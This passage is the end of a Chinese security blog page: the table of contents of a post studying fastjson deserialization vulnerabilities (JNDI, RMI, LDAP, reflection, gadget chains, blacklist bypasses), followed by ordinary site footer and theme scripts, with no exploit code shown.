href="#（1）整一个tomcat容器，并在容器中配置数据源"><span class="level-left"><span class="level-item">1.3.1</span><span class="level-item">（1）整一个tomcat容器，并在容器中配置数据源</span></span></a></li><li><a class="level is-mobile" href="#（2）去IDEA里面配置web"><span class="level-left"><span class="level-item">1.3.2</span><span class="level-item">（2）去IDEA里面配置web</span></span></a></li><li><a class="level is-mobile" href="#（3）跑jndi的demo代码，感受jndi的用处"><span class="level-left"><span class="level-item">1.3.3</span><span class="level-item">（3）跑jndi的demo代码，感受jndi的用处</span></span></a></li></ul></li><li><a class="level is-mobile" href="#4-RMI是什么东西？"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">4. RMI是什么东西？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#（1）通过一个demo快速认识rmi是如何调用的"><span class="level-left"><span class="level-item">1.4.1</span><span class="level-item">（1）通过一个demo快速认识rmi是如何调用的</span></span></a></li><li><a class="level is-mobile" href="#（2）深入理解rmi"><span class="level-left"><span class="level-item">1.4.2</span><span class="level-item">（2）深入理解rmi</span></span></a></li></ul></li><li><a class="level is-mobile" href="#5-ldap是什么？"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">5. ldap是什么？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#（1）安装并配置ldap服务器"><span class="level-left"><span class="level-item">1.5.1</span><span class="level-item">（1）安装并配置ldap服务器</span></span></a></li><li><a class="level is-mobile" href="#（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用"><span class="level-left"><span class="level-item">1.5.2</span><span class="level-item">（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用</span></span></a></li></ul></li><li><a class="level is-mobile" href="#6-java反射是什么？"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">6. java反射是什么？</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#（1）通过demo快速理解反射"><span class="level-left"><span class="level-item">1.6.1</span><span class="level-item">（1）通过demo快速理解反射</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#问题：我还是觉得你给出的例子体现不出灵活，怎么办？"><span class="level-left"><span class="level-item">1.6.1.1</span><span class="level-item">问题：我还是觉得你给出的例子体现不出灵活，怎么办？</span></span></a></li></ul></li><li><a class="level is-mobile" href="#（2）【关键！】和漏洞之间的联系？"><span class="level-left"><span class="level-item">1.6.2</span><span class="level-item">（2）【关键！】和漏洞之间的联系？</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#二、漏洞学习"><span class="level-left"><span class="level-item">2</span><span class="level-item">二、漏洞学习</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-fastjson"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">1. fastjson&lt;=1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#（1）漏洞简单复现"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">（1）漏洞简单复现</span></span></a></li><li><a class="level is-mobile" href="#（2）漏洞成因分析"><span class="level-left"><span class="level-item">2.1.2</span><span class="level-item">（2）漏洞成因分析</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#①问题1：为什么要继承AbstractTranslet类？"><span class="level-left"><span class="level-item">2.1.2.1</span><span class="level-item">①问题1：为什么要继承AbstractTranslet类？</span></span></a></li><li><a class="level is-mobile" href="#②为什么要这么构造json？"><span class="level-left"><span class="level-item">2.1.2.2</span><span class="level-item">②为什么要这么构造json？</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#2-fastjson-1-2-25-反序列化漏洞（学习JdbcRowSetImpl链的相关知识）"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#（1）黑白名单机制介绍"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">（1）黑白名单机制介绍</span></span></a></li><li><a class="level is-mobile" href="#（2）黑白名单绕过的复现"><span class="level-left"><span class="level-item">2.2.2</span><span class="level-item">（2）黑白名单绕过的复现</span></span></a></li><li><a class="level is-mobile" href="#（3）对两种poc绕过手法的分析"><span class="level-left"><span class="level-item">2.2.3</span><span class="level-item">（3）对两种poc绕过手法的分析</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#①第一种poc（1-2-25-1-2-47通杀！！！）"><span class="level-left"><span class="level-item">2.2.3.1</span><span class="level-item">①第一种poc（1.2.25-1.2.47通杀！！！）</span></span></a></li><li><a class="level is-mobile" href="#②第二种poc"><span class="level-left"><span class="level-item">2.2.3.2</span><span class="level-item">②第二种poc</span></span></a></li></ul></li><li><a class="level is-mobile" href="#（4）关于JdbcRowSetImpl链利用的分析"><span class="level-left"><span class="level-item">2.2.4</span><span class="level-item">（4）关于JdbcRowSetImpl链利用的分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#3-fastjson-1-2-42-反序列化漏洞"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">3. fastjson 1.2.42 反序列化漏洞</span></span></a></li><li><a class="level is-mobile" href="#4-fastjson-1-2-43-反序列化漏洞"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">4. fastjson 1.2.43 反序列化漏洞</span></span></a></li><li><a class="level is-mobile" href="#5-fastjson-1-2-44-mappings缓存导致反序列化漏洞"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">5. fastjson 1.2.44 mappings缓存导致反序列化漏洞</span></span></a></li><li><a class="level is-mobile" href="#6-fastjson-1-2-47-mappings缓存导致反序列化漏洞"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">6. fastjson 1.2.47 mappings缓存导致反序列化漏洞</span></span></a></li><li><a class="level is-mobile" href="#7-fastjson-1-2-68-反序列化漏洞"><span class="level-left"><span class="level-item">2.7</span><span class="level-item">7.fastjson 1.2.68 反序列化漏洞</span></span></a></li></ul></li><li><a class="level is-mobile" href="#四、参考与致谢"><span class="level-left"><span class="level-item">3</span><span class="level-item">四、参考与致谢</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/avatar.jpg" alt="W01fh4cker&#039;s blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 W01fh4cker</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2024</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>